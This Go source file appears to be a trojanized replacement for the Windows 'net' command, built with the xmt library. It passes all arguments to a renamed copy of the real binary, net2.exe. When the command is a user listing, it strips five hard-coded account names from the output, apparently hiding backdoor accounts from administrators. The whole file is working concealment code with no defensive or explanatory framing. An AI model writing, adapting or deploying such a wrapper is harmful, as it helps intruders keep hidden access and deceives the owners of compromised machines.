package main

import (
	"fmt"
	"os"
	"strings"

	"github.com/iDigitalFlame/xmt/cmd"
)

var a = []string{"Eve", "john", "admin9", "derp", "dadmin"}

func main() {
	var (
		e    = cmd.Process{Args: append([]string{`C:\Windows\System32\net2.exe`}, os.Args[1:]...)}
		o, _ = e.CombinedOutput()
		p    = string(o)
	)

	if len(os.Args) == 2 && strings.Contains(strings.ToLower(os.Args[1]), "user") {
		for i := range a {
			p = strings.ReplaceAll(p, a[i], "")
		}
	}

	fmt.Println(p)
}
